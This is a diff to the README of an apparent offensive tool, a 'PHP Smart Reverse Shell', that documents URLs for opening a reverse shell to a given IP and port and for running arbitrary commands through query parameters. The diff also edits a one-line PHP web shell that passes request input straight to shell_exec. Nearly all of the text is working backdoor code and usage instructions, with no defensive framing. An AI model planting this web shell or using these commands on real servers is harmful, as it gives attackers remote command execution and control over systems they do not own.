@@ -1,4 +1,4 @@
-# PHP Smart Reverse Shell script
+# PHP Smart Reverse Shell scripts
 
 ## Script Commands
 Call reverse shell from console
@@ -12,6 +12,10 @@ https://example.com/srs.php?ip=127.0.0.1&port=1234
 Run command from url
 ```url
 https://example.com/srs.php?c=ls%20-la
+```
+Run command from url (redirect errors to stdout)
+```url
+https://example.com/srs.php?r=ls%20-la
 ```
 ## Usefull commands
 
@@ -30,7 +34,7 @@ or
 ```
 or 
 ```PHP
-<?php if(isset($_GET['c'])){header('Content-Type: text/plain');die(shell_exec($_GET['c'.'2>&1']));}?>
+<?php if(isset($_GET['c'])){header('Content-Type: text/plain');die(shell_exec($_REQUEST['c'].'2>&1'));}?>
 ```
 
 Download Smart Reverse Shell and open shell connection
